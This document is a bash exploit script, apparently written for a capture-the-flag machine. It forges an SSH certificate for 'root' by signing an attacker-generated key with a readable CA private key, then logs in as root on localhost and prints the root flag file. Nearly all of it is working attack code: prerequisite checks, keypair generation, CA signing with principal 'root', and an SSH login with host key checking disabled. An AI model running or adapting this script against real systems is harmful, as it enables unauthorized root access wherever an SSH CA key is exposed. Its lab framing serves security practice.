#!/usr/bin/env bash
# =============================================================================
# privesc.sh — SSH CA certificate forgery for privilege escalation.
#
# ⚠️  RUN THIS ON THE TARGET, NOT ON KALI.
#
# Prerequisites:
#   - A shell as a member of the `deployers` group (e.g. svc-deploy)
#   - Read access to /opt/principal/ssh/ca (the CA private key)
#   - sshd has TrustedUserCAKeys but NO AuthorizedPrincipalsFile
#   - PermitRootLogin is `prohibit-password` (not `no`)
#
# What it does:
#   1. Generates an ed25519 attacker keypair
#   2. Signs the attacker's public key with the CA, setting principal = root
#   3. Verifies the certificate
#   4. Fixes permissions on the private key
#   5. Attempts to SSH as root and cat /root/root.txt
# =============================================================================

set -euo pipefail

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
CA_KEY="/opt/principal/ssh/ca"
SSHD_CONF="/etc/ssh/sshd_config.d/60-principal.conf"

KEY_PATH="/tmp/pwn"
PUB_PATH="/tmp/pwn.pub"
CERT_PATH="/tmp/pwn-cert.pub"

KEY_ID="pwn-root"
PRINCIPAL="root"
VALIDITY="+1h"

# ---------------------------------------------------------------------------
# Step 0 — Sanity checks
# ---------------------------------------------------------------------------
echo "[*] Checking prerequisites..."

if [[ ! -r "$CA_KEY" ]]; then
    echo "[!] Cannot read CA private key at $CA_KEY" >&2
    echo "    Are you a member of the 'deployers' group?" >&2
    echo "    Run: id" >&2
    exit 1
fi

if [[ ! -r "$SSHD_CONF" ]]; then
    echo "[!] sshd config not readable at $SSHD_CONF" >&2
    exit 1
fi

if ! grep -q "^TrustedUserCAKeys" "$SSHD_CONF"; then
    echo "[!] TrustedUserCAKeys not found in sshd config." >&2
    exit 1
fi

if grep -qE "^(AuthorizedPrincipalsFile|AuthorizedPrincipalsCommand)" "$SSHD_CONF"; then
    echo "[!] AuthorizedPrincipalsFile/Command IS configured." >&2
    echo "    The principal we sign for must be explicitly listed there." >&2
    echo "    Certificate forgery may not work as intended." >&2
    echo
    read -rp "Continue anyway? [y/N] " reply
    [[ "$reply" =~ ^[Yy]$ ]] || exit 1
fi

echo "[+] Prerequisites OK"
echo

# ---------------------------------------------------------------------------
# Step 1 — Enumerate CA directory
# ---------------------------------------------------------------------------
echo "[*] CA directory listing:"
ls -la /opt/principal/ssh/ || true
echo

# ---------------------------------------------------------------------------
# Step 2 — Generate attacker keypair
# ---------------------------------------------------------------------------
echo "[*] Generating attacker ed25519 keypair..."
rm -f "$KEY_PATH" "$PUB_PATH" "$CERT_PATH"
ssh-keygen -t ed25519 -f "$KEY_PATH" -N "" -q
echo "[+] Keypair:  $KEY_PATH  +  $PUB_PATH"
echo

# ---------------------------------------------------------------------------
# Step 3 — Sign the public key with the CA
# ---------------------------------------------------------------------------
echo "[*] Signing public key with CA (principal=$PRINCIPAL, ID=$KEY_ID)..."
ssh-keygen -s "$CA_KEY" \
           -I "$KEY_ID" \
           -n "$PRINCIPAL" \
           -V "$VALIDITY" \
           "$PUB_PATH"
echo

# ---------------------------------------------------------------------------
# Step 4 — Verify the certificate
# ---------------------------------------------------------------------------
echo "[*] Certificate details:"
ssh-keygen -L -f "$CERT_PATH" | sed 's/^/    /'
echo

if ! ssh-keygen -L -f "$CERT_PATH" | grep -q "^ *$PRINCIPAL$"; then
    echo "[!] Certificate does not list '$PRINCIPAL' as a principal." >&2
    echo "    Forged cert will not be accepted. Aborting." >&2
    exit 1
fi
echo "[+] Certificate lists '$PRINCIPAL' as a principal"
echo

# ---------------------------------------------------------------------------
# Step 5 — Lock down the private key
# ---------------------------------------------------------------------------
chmod 600 "$KEY_PATH"
echo "[+] Permissions set on $KEY_PATH"
echo

# ---------------------------------------------------------------------------
# Step 6 — Attempt root SSH
# ---------------------------------------------------------------------------
echo "[*] Attempting to SSH as $PRINCIPAL@localhost..."
echo "========================================================================"
ssh -i "$KEY_PATH" \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o LogLevel=ERROR \
    "$PRINCIPAL@localhost" \
    'echo "[+] id:"; id; echo; echo "[+] /root/root.txt:"; cat /root/root.txt 2>/dev/null || echo "(not readable)"'
echo "========================================================================"

echo
echo "[+] Done. If you didn't get a shell, debug with:"
echo "    ssh -vvv -i $KEY_PATH $PRINCIPAL@localhost"

# Make it executable:

# chmod +x scripts/privesc.sh